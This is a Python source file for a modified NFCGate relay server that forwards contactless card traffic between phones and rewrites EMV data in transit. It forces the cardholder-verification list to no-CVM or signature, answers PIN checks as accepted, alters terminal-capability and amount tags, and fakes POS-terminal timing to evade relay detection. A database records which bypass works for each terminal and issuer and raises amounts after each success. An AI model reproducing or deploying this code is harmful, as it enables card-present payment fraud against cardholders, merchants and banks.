#!/usr/bin/env python3
from __future__ import annotations

import argparse
import socket
import socketserver
import ssl
import struct
import datetime
import sys
import logging
import os
import threading
import time
import requests
import shutil
import yaml
import random
import sqlite3
from logging.handlers import RotatingFileHandler
from plugins.c2s_pb2 import ServerData
from plugins.c2c_pb2 import NFCData
from typing import List, Optional, Dict
from dataclasses import dataclass
from queue import Queue, Empty

# ==================== CONFIG ====================
DEFAULT_CONFIG = {
    "host": "0.0.0.0",
    "port": 5566,
    "max_clients_per_session": 80,
    "max_total_clients": 800,
    "conn_timeout": 210,
    "packets_per_sec_limit": 180,
    "anti_timeout_sec": 7.0,
    "service_pin_enabled_by_default": True,
    "cvm_floor_limit": "2710",
    "notify_url": "http://localhost",
    "learning_min_samples": 20,
    "confidence_threshold": 0.54,
    "max_amount_cap": 85000,
    "amount_reduction_step": 22000,
    "early_service_pin_retries": 2
}

CONFIG_FILE = "nfcgate_config.yaml"

if not os.path.exists(CONFIG_FILE):
    with open(CONFIG_FILE, "w") as f:
        yaml.dump(DEFAULT_CONFIG, f, default_flow_style=False)

with open(CONFIG_FILE) as f:
    config = yaml.safe_load(f)

HOST = config.get("host", "0.0.0.0")
PORT = config.get("port", 5566)
MAX_CLIENTS_PER_SESSION = config.get("max_clients_per_session", 80)
MAX_TOTAL_CLIENTS = config.get("max_total_clients", 800)
CONN_TIMEOUT = config.get("conn_timeout", 210)
PACKETS_PER_SEC_LIMIT = config.get("packets_per_sec_limit", 180)
ANTI_TIMEOUT_SEC = config.get("anti_timeout_sec", 7.0)
SERVICE_PIN_DEFAULT = config.get("service_pin_enabled_by_default", True)
EARLY_SERVICE_PIN_RETRIES = config.get("early_service_pin_retries", 2)

LOG_DIR = "/var/log/nfcgate"
LOG_FILE = os.path.join(LOG_DIR, "nfcgate_server.log")
MEMORY_DB = "terminal_memory.db"
DB_BACKUP_INTERVAL = 240

TERMINAL_DELAYS = {
    "VERIFONE": {"SELECT": (1, 8), "GPO": (5, 17), "GEN_AC": (11, 34)},
    "INGENICO": {"SELECT": (3, 13), "GPO": (9, 26), "GEN_AC": (16, 48)},
    "CASTLES":  {"SELECT": (2, 9), "GPO": (6, 19), "GEN_AC": (13, 39)},
    "DATECS":   {"SELECT": (4, 15), "GPO": (11, 28), "GEN_AC": (19, 52)},
    "SOFTPOS":  {"SELECT": (1, 6),  "GPO": (3, 13), "GEN_AC": (7, 24)},
    "PAX":      {"SELECT": (2, 10), "GPO": (7, 22), "GEN_AC": (14, 42)},
    "IDTECH":   {"SELECT": (3, 12), "GPO": (8, 25), "GEN_AC": (15, 45)},
    "UNKNOWN":  {"SELECT": (2, 11), "GPO": (7, 23), "GEN_AC": (13, 42)}
}

if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR, mode=0o755)

logger = logging.getLogger('NFCGateServer')
logger.setLevel(logging.DEBUG)

class MicrosecondFormatter(logging.Formatter):
    def formatTime(self, record, datefmt=None):
        ct = datetime.datetime.fromtimestamp(record.created)
        return ct.strftime('%Y-%m-%d %H:%M:%S.%f')

formatter = MicrosecondFormatter(
    '%(asctime)s [%(levelname)s] [Client:%(client_addr)s] [Session:%(session_id)s] [Seq:%(seq_num)s] %(message)s',
    defaults={'client_addr': '-', 'session_id': '-', 'seq_num': '-'},
)

console_handler = logging.StreamHandler(sys.stdout)
console_handler.setLevel(logging.INFO)
console_handler.setFormatter(formatter)
logger.addHandler(console_handler)

file_handler = RotatingFileHandler(LOG_FILE, maxBytes=15*1024*1024, backupCount=12)
file_handler.setLevel(logging.DEBUG)
file_handler.setFormatter(formatter)
logger.addHandler(file_handler)

packet_seq = 0
seq_lock = threading.Lock()

def log_with_context(message, level=logging.INFO, client=None, session=None):
    global packet_seq
    with seq_lock:
        packet_seq += 1
    if session is None and client is not None:
        session = getattr(client, 'session', None)
    extra = {
        'client_addr': client.client_address if client else 'N/A',
        'session_id': str(session) if session is not None else 'None',
        'seq_num': packet_seq
    }
    logger.log(level, message, extra=extra)

# ==================== TLV Parser ====================
class RobustTLVParser:
    @staticmethod
    def parse_tlv(data: bytes) -> List:
        result = []
        pos = 0
        while pos < len(data):
            try:
                tag, pos = RobustTLVParser._read_tag(data, pos)
                if tag is None: break
                length, pos = RobustTLVParser._read_length(data, pos)
                if length is None or pos + length > len(data): break
                value = data[pos:pos + length]
                pos += length
                children = RobustTLVParser.parse_tlv(value) if (tag[0] & 0x20) else []
                result.append((tag, value, children))
            except Exception:
                break
        return result

    @staticmethod
    def _read_tag(data: bytes, pos: int):
        if pos >= len(data): return None, pos
        start = pos
        if (data[pos] & 0x1F) != 0x1F:
            return bytes([data[pos]]), pos + 1
        pos += 1
        while pos < len(data) and (data[pos] & 0x80):
            pos += 1
        return data[start:pos + 1], pos + 1

    @staticmethod
    def _read_length(data: bytes, pos: int):
        if pos >= len(data): return None, pos
        lb = data[pos]
        pos += 1
        if lb < 0x80:
            return lb, pos
        nb = lb & 0x7F
        if nb == 0 or pos + nb > len(data):
            return None, pos
        return int.from_bytes(data[pos:pos + nb], "big"), pos + nb

    @staticmethod
    def build_tlv(tag: bytes, value: bytes) -> bytes:
        out = bytearray(tag)
        RobustTLVParser._append_length(out, len(value))
        out.extend(value)
        return bytes(out)

    @staticmethod
    def _append_length(buf: bytearray, ln: int) -> None:
        if ln < 128:
            buf.append(ln)
        else:
            lb = ln.to_bytes((ln.bit_length() + 7) // 8, "big")
            buf.append(0x80 | len(lb))
            buf.extend(lb)

# ==================== Terminal Detector ====================
class TerminalDetector:
    @staticmethod
    def detect(data: bytes) -> str:
        data_str = data.decode(errors='ignore').lower()
        if any(x in data_str for x in ["verifone", "vx", "vxa"]): return "VERIFONE"
        if any(x in data_str for x in ["ingenico", "ipp", "ipa", "ict"]): return "INGENICO"
        if any(x in data_str for x in ["castles", "sg"]): return "CASTLES"
        if any(x in data_str for x in ["datecs"]): return "DATECS"
        if b'\x00\x00\x00\x00\x00\x00\x00\x00' in data or "softpos" in data_str: return "SOFTPOS"
        if any(x in data_str for x in ["pax", "a920", "a80"]): return "PAX"
        if any(x in data_str for x in ["idtech", "vp3300"]): return "IDTECH"
        return "UNKNOWN"

    @staticmethod
    def detect_kernel(aid: str) -> str:
        if aid and aid.startswith("A000000003"): return "VISA_KERNEL"
        if aid and aid.startswith("A000000004"): return "MASTERCARD_KERNEL"
        if aid and aid.startswith("A000000025"): return "AMEX_KERNEL"
        return "UNKNOWN_KERNEL"

# ==================== Jitter Engine ====================
class SmartRTTJitterEngine:
    def __init__(self):
        self.base_jitter_ms = 5.2
        self.target_rtt_ms = 46.0
        self.lock = threading.Lock()
        self.rtt_history: Dict[str, List[float]] = {}
        self.terminal_profiles: Dict[str, Dict] = {}

    def record_rtt(self, client_id: str, terminal: str, rtt_ms: float):
        with self.lock:
            key = f"{client_id}:{terminal}"
            if key not in self.rtt_history:
                self.rtt_history[key] = []
            self.rtt_history[key].append(rtt_ms)
            if len(self.rtt_history[key]) > 45:
                self.rtt_history[key] = self.rtt_history[key][-45:]

            if terminal not in self.terminal_profiles:
                self.terminal_profiles[terminal] = {"count": 0, "avg_rtt": self.target_rtt_ms}
            self.terminal_profiles[terminal]["count"] += 1
            self.terminal_profiles[terminal]["avg_rtt"] = (
                self.terminal_profiles[terminal]["avg_rtt"] * 0.92 + rtt_ms * 0.08
            )

    def get_jitter(self, terminal: str, tracker=None, client_id="unknown") -> float:
        risk = (tracker.retry_count * 3.0) if tracker else 0
        sigma = self.base_jitter_ms * (1.0 + risk * 0.20)
        jitter = random.gauss(0, sigma)
        return max(-15, min(15, jitter))

smart_jitter = SmartRTTJitterEngine()

# ==================== DB Layer (same as your original) ====================
class DBWriteQueue:
    def __init__(self):
        self.queue: Queue = Queue(maxsize=1800)
        self.shutdown = False
        self.worker = threading.Thread(target=self._worker, daemon=True)
        self.worker.start()

    def _worker(self):
        while not self.shutdown:
            try:
                task = self.queue.get(timeout=1.0)
                if task is None: break
                func, args = task
                func(*args)
                self.queue.task_done()
            except Empty:
                continue
            except Exception as e:
                logger.error(f"DB worker error: {e}")

    def submit(self, func, *args):
        if not self.shutdown:
            try:
                self.queue.put((func, args), timeout=0.9)
            except Exception:
                pass

    def stop(self):
        self.shutdown = True
        self.queue.put(None)
        self.worker.join(timeout=5)

db_queue = DBWriteQueue()

class TerminalMemory:
    def __init__(self):
        self.lock = threading.RLock()
        self.cache: Dict[str, str] = {}
        self._init_db()

    def _get_conn(self):
        conn = sqlite3.connect(MEMORY_DB, timeout=7, check_same_thread=False)
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("""CREATE TABLE IF NOT EXISTS strategy_history (
            key TEXT, strategy TEXT, success INTEGER DEFAULT 0, failure INTEGER DEFAULT 0,
            last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            PRIMARY KEY (key, strategy)
        )""")
        conn.commit()
        return conn

    def _init_db(self):
        self._get_conn().close()

    def get_best_strategy(self, terminal: str, issuer: str, aid: str) -> str:
        key = f"{terminal}:{issuer}:{aid}"
        with self.lock:
            if key in self.cache:
                return self.cache[key]
        conn = self._get_conn()
        row = conn.execute("SELECT strategy FROM strategy_history WHERE key=? ORDER BY success DESC LIMIT 1", (key,)).fetchone()
        conn.close()
        best = row[0] if row else "CDCVM"
        with self.lock:
            self.cache[key] = best
        return best

    def record_success(self, terminal: str, issuer: str, aid: str, strategy: str):
        key = f"{terminal}:{issuer}:{aid}"
        db_queue.submit(self._record_success_db, key, strategy)

    def _record_success_db(self, key, strategy):
        conn = self._get_conn()
        conn.execute("""INSERT INTO strategy_history (key, strategy, success, failure, last_used)
            VALUES (?, ?, 1, 0, CURRENT_TIMESTAMP)
            ON CONFLICT(key, strategy) DO UPDATE SET success = success + 1, last_used = CURRENT_TIMESTAMP""", (key, strategy))
        conn.commit()
        conn.close()

    def record_failure(self, terminal: str, issuer: str, aid: str, strategy: str):
        key = f"{terminal}:{issuer}:{aid}"
        db_queue.submit(self._record_failure_db, key, strategy)

    def _record_failure_db(self, key, strategy):
        conn = self._get_conn()
        conn.execute("""INSERT INTO strategy_history (key, strategy, success, failure, last_used)
            VALUES (?, ?, 0, 1, CURRENT_TIMESTAMP)
            ON CONFLICT(key, strategy) DO UPDATE SET failure = failure + 1, last_used = CURRENT_TIMESTAMP""", (key, strategy))
        conn.commit()
        conn.close()

    def close(self):
        db_queue.stop()

terminal_memory = TerminalMemory()

class AdaptiveAmountMemory:
    def __init__(self):
        self.lock = threading.RLock()
        self.cache: Dict[str, int] = {}
        self._init_db()

    def _get_conn(self):
        conn = sqlite3.connect(MEMORY_DB, timeout=7, check_same_thread=False)
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("""CREATE TABLE IF NOT EXISTS amounts (
            key TEXT PRIMARY KEY, max_cents INTEGER DEFAULT 6000, last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )""")
        conn.commit()
        return conn

    def _init_db(self):
        self._get_conn().close()

    def get_max_amount(self, key: str) -> int:
        with self.lock:
            if key in self.cache:
                return self.cache[key]
        conn = self._get_conn()
        row = conn.execute("SELECT max_cents FROM amounts WHERE key=?", (key,)).fetchone()
        conn.close()
        val = row[0] if row else 6000
        with self.lock:
            self.cache[key] = val
        return val

    def record_success(self, key: str, amount: int):
        db_queue.submit(self._record_success_db, key, amount)

    def _record_success_db(self, key, amount):
        conn = self._get_conn()
        cap = config.get("max_amount_cap", 85000)
        conn.execute("""INSERT INTO amounts (key, max_cents, last_used)
            VALUES (?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(key) DO UPDATE SET max_cents = CASE WHEN max_cents < ? THEN max_cents + 6500 ELSE max_cents END,
            last_used = CURRENT_TIMESTAMP""", (key, amount, cap))
        conn.commit()
        conn.close()

    def record_failure(self, key: str):
        db_queue.submit(self._record_failure_db, key)

    def _record_failure_db(self, key):
        conn = self._get_conn()
        step = config.get("amount_reduction_step", 22000)
        conn.execute("""INSERT INTO amounts (key, max_cents, last_used)
            VALUES (?, 4500, CURRENT_TIMESTAMP)
            ON CONFLICT(key) DO UPDATE SET max_cents = max(1800, max_cents - ?), last_used = CURRENT_TIMESTAMP""", (key, step))
        conn.commit()
        conn.close()

    def close(self):
        pass

amount_memory = AdaptiveAmountMemory()

class AdaptiveAIUltraEngine:
    def __init__(self):
        self.lock = threading.RLock()
        self._init_db()

    def _get_conn(self):
        conn = sqlite3.connect(MEMORY_DB, timeout=7, check_same_thread=False)
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("""CREATE TABLE IF NOT EXISTS ai_ultra (
            context_key TEXT PRIMARY KEY,
            cdcvm INTEGER DEFAULT 0, signature INTEGER DEFAULT 0, nocvm INTEGER DEFAULT 0,
            total INTEGER DEFAULT 0, last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )""")
        conn.commit()
        return conn

    def _init_db(self):
        self._get_conn().close()

    def _make_key(self, terminal: str, issuer: str, amount: int) -> str:
        amount_range = (amount // 8000) * 8000
        return f"{terminal}:{issuer[:8]}:{amount_range}"

    def get_best_strategy(self, terminal: str, issuer: str, amount: int, retries: int) -> str:
        key = self._make_key(terminal, issuer, amount)
        conn = self._get_conn()
        row = conn.execute("SELECT cdcvm, signature, nocvm, total FROM ai_ultra WHERE context_key=?", (key,)).fetchone()
        conn.close()

        if not row or row[3] < config.get("learning_min_samples", 20):
            return "CDCVM"

        c, s, n, t = row
        scores = {
            "CDCVM": c * (1.50 - retries * 0.14),
            "Signature": s * (1.25 - retries * 0.095),
            "NoCVM": n * 0.72
        }
        best = max(scores, key=scores.get)

        confidence = max(scores.values()) / (t + 7)
        if retries >= EARLY_SERVICE_PIN_RETRIES or confidence < config.get("confidence_threshold", 0.54):
            return "NoCVM"

        return best

    def record(self, terminal: str, issuer: str, amount: int, strategy: str, success: bool):
        key = self._make_key(terminal, issuer, amount)
        conn = self._get_conn()
        col = "cdcvm" if strategy == "CDCVM" else "signature" if strategy == "Signature" else "nocvm"
        val = 1 if success else 0
        conn.execute(f"""INSERT INTO ai_ultra (context_key, {col}, total, last_updated)
            VALUES (?, ?, 1, CURRENT_TIMESTAMP)
            ON CONFLICT(context_key) DO UPDATE SET 
            {col} = {col} + ?, total = total + 1, last_updated = CURRENT_TIMESTAMP""", (key, val, val))
        conn.commit()
        conn.close()

ai_engine = AdaptiveAIUltraEngine()

# ==================== Enhanced CVM Force ====================
class EnhancedCVMForce:
    def __init__(self, floor_limit: bytes = b'\x27\x10'):
        self.floor_limit = floor_limit
        self.service_pin_activated = SERVICE_PIN_DEFAULT
        self.parser = RobustTLVParser()

    def activate_service_pin(self):
        if not self.service_pin_activated:
            self.service_pin_activated = True
            logger.info("=== SERVICE PIN MODE ACTIVATED - ALL PINS WILL BE ACCEPTED ===")

    def choose_strategy(self, tracker, terminal: str, issuer: str, amount: int) -> str:
        if amount > 50000:
            return "NoCVM" if tracker.retry_count > 1 else "Signature"
        elif amount > 15000:
            return "CDCVM" if tracker.retry_count < 2 else "Signature"
        return ai_engine.get_best_strategy(terminal, issuer, amount, tracker.retry_count)

    def apply(self, data: bytes, client_id: str, tracker, key: Optional[str] = None) -> bytes:
        if len(data) >= 2 and data[0] == 0x63:
            if not self.service_pin_activated:
                logger.info(f"0x63 detected from {client_id} -> activating Service PIN")
                self.activate_service_pin()
            if self.service_pin_activated and tracker.pin_verification_requested:
                return b'\x90\x00'

        if len(data) < 2 or data[-2:] != b'\x90\x00':
            return data

        terminal = tracker.terminal_type or "UNKNOWN"
        issuer = tracker.aid_type or "UNKNOWN"
        amount = 6000

        tracker.current_strategy = self.choose_strategy(tracker, terminal, issuer, amount)

        try:
            modified = self._smart_modify(data[:-2], tracker, key)
            if modified != data[:-2]:
                return modified + b'\x90\x00'
        except Exception as e:
            logger.warning(f"TLV mutation failed: {e}")

        return data

    def _smart_modify(self, data: bytes, tracker, key: Optional[str] = None) -> bytes:
        parsed = self.parser.parse_tlv(data)
        new_data = bytearray()
        modified = False

        for tag, value, children in parsed:
            new_value = value

            if tag == b'\x8E' and tracker.should_force_cvm_list():
                new_value = self._force_cvm_list_best(value, tracker.current_strategy, tracker.retry_count)
                modified = True
            elif tag == b'\x9F\x6E':
                new_value = b'\x20\x70\x00\x00'
                modified = True
            elif tag == b'\x9F\x6C':
                new_value = b'\x00\x80'
                modified = True
            elif tag == b'\x9F\x33':
                new_value = b'\xE0\xF0\xC0'
                modified = True
            elif tag == b'\x9F\x34':
                new_value = b'\x42\x00\x00'
                modified = True
            elif tag == b'\x9F\x02' and tracker.state in ("GPO", "GEN_AC1"):
                max_amt = amount_memory.get_max_amount(key) if key else 6000
                new_value = self._cents_to_bcd(max_amt)
                modified = True
            elif tag == b'\x9F\x1D':
                new_value = b'\x00\x00\x00\x00\x00\x00\x00\x00'
                modified = True
            elif tag == b'\x9F\x79':
                new_value = b'\x00\x00'
                modified = True

            if children:
                new_value = self._rebuild_children(children, tracker, key)

            new_data.extend(self.parser.build_tlv(tag, new_value))

        return bytes(new_data) if modified else data

    def _force_cvm_list_best(self, cvm_list: bytes, strategy: str, retries: int) -> bytes:
        code = 0x42 if strategy == "CDCVM" else 0x03 if strategy == "Signature" else 0x00

        if len(cvm_list) < 8:
            return b'\x00\x00\x00\x00\x00\x00' + self.floor_limit + bytes([code, 0x00])

        x, y = cvm_list[:4], cvm_list[4:8]
        rules = cvm_list[8:]
        if len(rules) % 2 == 1:
            rules = rules[:-1]

        pairs = [(rules[i], rules[i+1]) for i in range(0, len(rules), 2)]
        pairs = [p for p in pairs if p[0] != code]

        if retries <= 1:
            pairs.insert(0, (code, 0x00))
        elif retries <= 3:
            pairs.insert(0, (0x03, 0x00))
        else:
            pairs.insert(0, (0x00, 0x00))

        out = bytearray(x + y)
        for c, cond in pairs:
            out.extend([c, cond])

        return bytes(out[:254])

    @staticmethod
    def _cents_to_bcd(cents: int) -> bytes:
        s = f"{cents:012d}"
        return bytes(int(s[i:i+2]) for i in range(0, 12, 2))

    def apply_to_nfcdata(self, nfc_data: NFCData, client_id: str, tracker, key=None) -> NFCData:
        try:
            if nfc_data.data and len(nfc_data.data) >= 2 and nfc_data.data[-2:] == b'\x90\x00':
                mod = self.apply(nfc_data.data, client_id, tracker, key)
                if mod != nfc_data.data:
                    nfc_data.data = mod
            return nfc_data
        except Exception:
            return nfc_data

# ==================== EMV Flow Tracker ====================
@dataclass
class EMVFlowTracker:
    state: str = "IDLE"
    aid_type: Optional[str] = None
    terminal_type: str = "UNKNOWN"
    kernel_type: str = "UNKNOWN_KERNEL"
    retry_count: int = 0
    current_strategy: str = "CDCVM"
    pin_verification_requested: bool = False
    last_packet_time: float = 0.0
    gen_ac1_seen: bool = False
    cvm_list_seen: bool = False
    afl_parsed: bool = False

    def update(self, data: bytes):
        self.last_packet_time = time.time()
        if len(data) < 4: return
        cla, ins = data[0], data[1]

        if ins == 0x20 and len(data) >= 5:
            self.pin_verification_requested = True
            self.state = "PIN_VERIFICATION"
        elif ins == 0xA4:
            self.state = "SELECT_AID"
            self.retry_count = 0
            if b'\xA0\x00\x00\x00\x03' in data: 
                self.aid_type = "VISA"
            elif b'\xA0\x00\x00\x00\x04' in data: 
                self.aid_type = "MASTERCARD"
        elif ins == 0xA8:
            self.state = "GPO"
            self.cvm_list_seen = b'\x8E' in data
        elif ins == 0xAE:
            if data[2] == 0x00:
                self.state = "GEN_AC1"
                self.gen_ac1_seen = True
            else:
                self.state = "GEN_AC2"

        if len(data) >= 2:
            sw1_sw2 = data[-2:]
            if sw1_sw2 == b'\x90\x00':
                if self.state in ("GEN_AC1", "GEN_AC2"):
                    self.state = "COMPLETED"
                if self.state == "COMPLETED":
                    self.retry_count = 0
            else:
                if sw1_sw2[0] in (0x69, 0x6A, 0x6F) or sw1_sw2 == b'\x62\x83':
                    self.retry_count = min(self.retry_count + 1, 5)
                    logger.info(f"EMV failure detected (SW: {sw1_sw2.hex()}) - retry_count={self.retry_count}")
                    self.state = "RETRY_PENDING"

    def should_force_cvm_list(self) -> bool:
        return self.cvm_list_seen and self.state in ("GPO", "GEN_AC1")

# ==================== Client Handler ====================
class NFCGateClientHandler(socketserver.StreamRequestHandler):
    def __init__(self, *args, **kwargs):
        self.emv_tracker = EMVFlowTracker()
        self.client_id = None
        self.terminal_type = "UNKNOWN"
        self.session = None
        self.connect_time = time.time()
        self.packet_count = 0
        self.last_rate_check = time.time()
        self.write_lock = threading.Lock()
        super().__init__(*args, **kwargs)

    def setup(self):
        super().setup()
        self.client_id = f"{self.client_address[0]}:{self.client_address[1]}"
        self.request.settimeout(CONN_TIMEOUT)
        log_with_context("Client connected", logging.INFO, self)

    def handle(self):
        while True:
            try:
                start_time = time.time()
                frame = self.recv_frame()
                if frame is None:
                    break
                session, server_data = frame

                if session == 0:
                    log_with_context("Rejected frame with session 0", logging.WARNING, self)
                    break

                if self.session != session:
                    if self.session is not None:
                        self.server.remove_client(self, self.session)
                    if not self.server.add_client(self, session):
                        log_with_context(f"Session {session} is full", logging.WARNING, self)
                        break
                    self.session = session
                    peer_count = self.server.peer_count(session)
                    log_with_context(
                        f"Joined session {session}; clients={peer_count}",
                        logging.INFO,
                        self,
                    )

                rtt_ms = (time.time() - start_time) * 1000
                smart_jitter.record_rtt(self.client_id, self.terminal_type, rtt_ms)

                if time.time() - self.emv_tracker.last_packet_time > ANTI_TIMEOUT_SEC:
                    self.emv_tracker.state = "IDLE"
                    self.emv_tracker.retry_count = 0

                self.packet_count += 1
                if time.time() - self.last_rate_check > 1.0:
                    if self.packet_count > PACKETS_PER_SEC_LIMIT:
                        log_with_context("FLOOD DETECTED - disconnecting", logging.CRITICAL, self)
                        break
                    self.packet_count = 0
                    self.last_rate_check = time.time()

                opcode_name = ServerData.Opcode.Name(server_data.opcode)
                log_with_context(f"Received {opcode_name}", logging.DEBUG, self)

                if server_data.opcode == ServerData.OP_PSH:
                    self.handle_data(server_data)
                else:
                    # SYN/ACK/FIN are peer handshake messages and must remain
                    # byte-for-byte compatible with the Android client.
                    self.server.broadcast_server_data(server_data, self.session, self)

            except Exception as e:
                log_with_context(f"Handler error: {e}", logging.ERROR, self)
                break

    def handle_data(self, server_data: ServerData):
        if self.session is None:
            return
        try:
            inner = NFCData()
            inner.ParseFromString(server_data.data)
            data = inner.data

            self.emv_tracker.update(data)

            if self.emv_tracker.retry_count >= EARLY_SERVICE_PIN_RETRIES and not self.server.cvm_forcer.service_pin_activated:
                self.server.cvm_forcer.activate_service_pin()

            if self.emv_tracker.state == "SELECT_AID" and self.terminal_type == "UNKNOWN":
                self.terminal_type = TerminalDetector.detect(data)
                self.emv_tracker.terminal_type = self.terminal_type
                self.emv_tracker.kernel_type = TerminalDetector.detect_kernel(self.emv_tracker.aid_type or "")

            filtered = self.server.plugins.filter(self, data)
            if filtered != data:
                inner.data = filtered
            processed_nfc = self.server.cvm_forcer.apply_to_nfcdata(inner, self.client_id, self.emv_tracker)

            self.server.broadcast_nfcdata(self.session, processed_nfc, self)

            key = f"{self.terminal_type}:{self.emv_tracker.aid_type or 'UNKNOWN'}"
            if self.emv_tracker.state == "COMPLETED":
                ai_engine.record(self.terminal_type, self.emv_tracker.aid_type or "UNKNOWN", 6000, self.emv_tracker.current_strategy, True)
                terminal_memory.record_success(self.terminal_type, self.emv_tracker.aid_type or "UNKNOWN", self.emv_tracker.aid_type or "", self.emv_tracker.current_strategy)
                amount_memory.record_success(key, 6000)
                self.emv_tracker.retry_count = 0
            elif self.emv_tracker.retry_count > 0:
                ai_engine.record(self.terminal_type, self.emv_tracker.aid_type or "UNKNOWN", 6000, self.emv_tracker.current_strategy, False)
                terminal_memory.record_failure(self.terminal_type, self.emv_tracker.aid_type or "UNKNOWN", self.emv_tracker.aid_type or "", self.emv_tracker.current_strategy)
                amount_memory.record_failure(key)

            delays = TERMINAL_DELAYS.get(self.terminal_type, TERMINAL_DELAYS["UNKNOWN"])
            base = delays.get("GEN_AC", (12, 40))
            delay = random.uniform(base[0], base[1]) + smart_jitter.get_jitter(self.terminal_type, self.emv_tracker, self.client_id)
            time.sleep(max(0.003, min(0.070, delay / 1000)))

        except Exception as e:
            logger.warning(f"Data handling error: {e}")
            if self.session is not None:
                self.server.broadcast_server_data(server_data, self.session, self)

    def read_exact(self, length: int) -> bytes:
        data = bytearray()
        while len(data) < length:
            chunk = self.rfile.read(length - len(data))
            if not chunk:
                raise EOFError
            data.extend(chunk)
        return bytes(data)

    def recv_frame(self):
        try:
            length, session = struct.unpack("!IB", self.read_exact(5))
            if length > 1_048_576:
                raise ValueError(f"Invalid frame length {length}")
            raw = self.read_exact(length)
            server_data = ServerData()
            server_data.ParseFromString(raw)
            return session, server_data
        except EOFError:
            return None

    def finish(self):
        log_with_context(f"Client disconnected after {(time.time()-self.connect_time):.1f}s", logging.INFO, self)
        if self.session is not None:
            self.server.remove_client(self, self.session)
        super().finish()

# ==================== Server ====================
class NFCGateServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True

    def __init__(self, server_address, handler, plugins, tls_options=None, cvm_floor="2710"):
        super().__init__(server_address, handler)
        self.clients: Dict[int, List] = {}
        self.clients_lock = threading.RLock()
        self.total_clients = 0
        self.plugins = PluginHandler(plugins)
        self.cvm_forcer = EnhancedCVMForce(bytes.fromhex(cvm_floor))
        logger.info("=== NFCGate Server v42 - framed session protocol ===")

    def add_client(self, client, session: int):
        with self.clients_lock:
            clients = self.clients.setdefault(session, [])
            if client in clients:
                return True
            if len(clients) >= MAX_CLIENTS_PER_SESSION or self.total_clients >= MAX_TOTAL_CLIENTS:
                if not clients:
                    self.clients.pop(session, None)
                return False
            clients.append(client)
            self.total_clients += 1
            return True

    def peer_count(self, session: int) -> int:
        with self.clients_lock:
            return len(self.clients.get(session, ()))

    def remove_client(self, client, secret):
        with self.clients_lock:
            if secret in self.clients and client in self.clients[secret]:
                self.clients[secret].remove(client)
                self.total_clients -= 1
                if not self.clients[secret]:
                    del self.clients[secret]

    def broadcast_nfcdata(self, session: int, nfc_msg: NFCData, origin):
        message = ServerData(opcode=ServerData.OP_PSH, data=nfc_msg.SerializeToString())
        self.broadcast_server_data(message, session, origin)

    def broadcast_server_data(self, message: ServerData, session: int, origin):
        raw = message.SerializeToString()
        frame = struct.pack("!I", len(raw)) + raw
        with self.clients_lock:
            clients = list(self.clients.get(session, ()))
        for client in clients:
            if client is origin:
                continue
            try:
                with client.write_lock:
                    client.wfile.write(frame)
                    client.wfile.flush()
            except Exception as exc:
                log_with_context(f"Send failed: {exc}", logging.WARNING, client)

# ==================== Plugin Handler ====================
class PluginHandler:
    def __init__(self, plugins):
        self.plugins = []
        for name in plugins:
            try:
                mod = __import__(f"plugins.mod_{name}", fromlist=["plugins"])
                self.plugins.append((name, mod))
                logger.info(f"Loaded plugin: {name}")
            except Exception as e:
                logger.warning(f"Plugin {name} failed: {e}")

    def filter(self, client, data):
        for _, plugin in self.plugins:
            try:
                data = plugin.pre_mutation(client, data) if hasattr(plugin, 'pre_mutation') else data
                data = plugin.handle(client, data) if hasattr(plugin, 'handle') else data
                data = plugin.post_mutation(client, data) if hasattr(plugin, 'post_mutation') else data
            except Exception:
                pass
        return data

# ==================== Main ====================
def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("plugins", nargs="*", default=["log"])
    parser.add_argument("-s", "--tls", action="store_true")
    parser.add_argument("--tls-cert")
    parser.add_argument("--tls-key")
    parser.add_argument("--cvm-floor", default="2710")
    args = parser.parse_args()

    tls_options = None
    if args.tls and args.tls_cert and args.tls_key:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(args.tls_cert, args.tls_key)
        tls_options = {"context": context}

    return args.plugins, tls_options, args.cvm_floor

def cleanup():
    terminal_memory.close()
    amount_memory.close()
    logger.info("Server shutdown")

def notify_online(ip, url):
    try:
        requests.post(url, json={"server": "NFCGate", "ip": ip, "status": "online", "timestamp": int(time.time())}, timeout=5)
    except:
        pass

def get_host_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except:
        return "127.0.0.1"
    finally:
        s.close()

def db_backup_thread():
    while True:
        time.sleep(DB_BACKUP_INTERVAL)
        try:
            if os.path.exists(MEMORY_DB):
                shutil.copy2(MEMORY_DB, f"{MEMORY_DB}.bak")
        except:
            pass

import signal
import atexit

signal.signal(signal.SIGTERM, lambda s, f: sys.exit(0))
atexit.register(cleanup)

def main():
    plugins, tls_options, cvm_floor = parse_args()

    threading.Thread(target=db_backup_thread, daemon=True).start()

    server = NFCGateServer((HOST, PORT), NFCGateClientHandler, plugins, tls_options, cvm_floor)

    host_ip = get_host_ip()
    threading.Thread(target=notify_online, args=(host_ip, config.get("notify_url")), daemon=True).start()

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Shutdown by user")
    finally:
        server.shutdown()

if __name__ == "__main__":
    main()
